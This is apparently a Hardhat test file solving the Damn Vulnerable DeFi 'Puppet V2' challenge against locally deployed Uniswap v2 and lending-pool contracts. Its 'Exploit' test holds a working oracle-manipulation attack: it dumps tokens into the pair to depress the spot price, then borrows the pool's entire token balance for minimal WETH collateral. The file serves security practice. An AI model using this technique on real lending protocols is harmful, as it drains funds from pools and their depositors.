import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";
import { uniswap, WETH9__factory } from "../../typechain-types";

const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");


describe("PuppetV2 Test", function () {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    
    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    
  async function setupFixture() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker] = await ethers.getSigners();
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x1158e460913d00000", // 20 ETH
    ]);

    const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
    const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
    const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

    // Deploy tokens to be traded
    const token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
    const weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

    // Deploy Uniswap Factory and Router
    const uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
    const uniswapRouter = await UniswapRouterFactory.deploy(
        uniswapFactory.address,
        weth.address
    );        

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(
        uniswapRouter.address,
        UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await uniswapRouter.addLiquidityETH(
        token.address,
        UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
        0,                                                          // amountTokenMin
        0,                                                          // amountETHMin
        deployer.address,                                           // to
        (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
        { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    const uniswapExchange = await UniswapPairFactory.attach(
        await uniswapFactory.getPair(token.address, weth.address)
    );

    // Deploy the lending pool
    const lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
      weth.address,
      token.address,
      uniswapExchange.address,
      uniswapFactory.address
  );

    // Setup initial token balances of pool and attacker account
    await token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
     
    return {uniswapExchange, lendingPool, token, uniswapRouter, weth};
  }

    it("Deployment", async function () {
      const {uniswapExchange, lendingPool} = await loadFixture(setupFixture);
      expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));
      expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

      // Ensure correct setup of pool.
      expect(
          await lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
      ).to.be.eq(ethers.utils.parseEther('0.3'));
      expect(
          await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
      ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it("Exploit", async function () {
      const {uniswapExchange, lendingPool, token, uniswapRouter, weth} = await loadFixture(setupFixture);
      await token.connect(attacker).approve(uniswapRouter.address, ethers.utils.parseEther("10000"));
      await uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, ethers.constants.Zero, [token.address, weth.address],  attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2);
      await weth.connect(attacker).deposit({value: ethers.BigNumber.from("29496494833197321980")});

      const wethRequired = await lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1000000"));
      
      await weth.connect(attacker).approve(lendingPool.address, wethRequired);
      await lendingPool.connect(attacker).borrow(ethers.utils.parseEther("1000000"));

      // Attacker has taken all tokens from the pool        
      expect(
        await token.balanceOf(lendingPool.address)
      ).to.be.eq('0');

      expect(
        await token.balanceOf(attacker.address)
      ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);

    });
  });
